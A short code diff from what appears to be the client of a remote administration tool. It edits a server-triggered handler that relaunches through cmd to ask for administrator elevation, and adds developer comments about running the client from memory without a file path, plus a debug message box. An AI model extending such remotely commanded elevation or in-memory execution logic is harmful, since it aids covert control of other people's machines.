@@ -442,8 +442,12 @@ namespace xClient.Core.Commands
 
         public static void HandleDoAskElevate(Packets.ServerPackets.DoAskElevate command, Client client)
         {
+            //Will this no longer work if the client is launched from an In-Memory context?
+            //There is no ClientData.CurrentPath if it's running from Memory.
+            //Will need to update this.
             if (WindowsAccountHelper.GetAccountType() != "Admin")
             {
+                MessageBox.Show(ClientData.CurrentPath.ToString());
                 ProcessStartInfo processStartInfo = new ProcessStartInfo
                 {
                     FileName = "cmd",
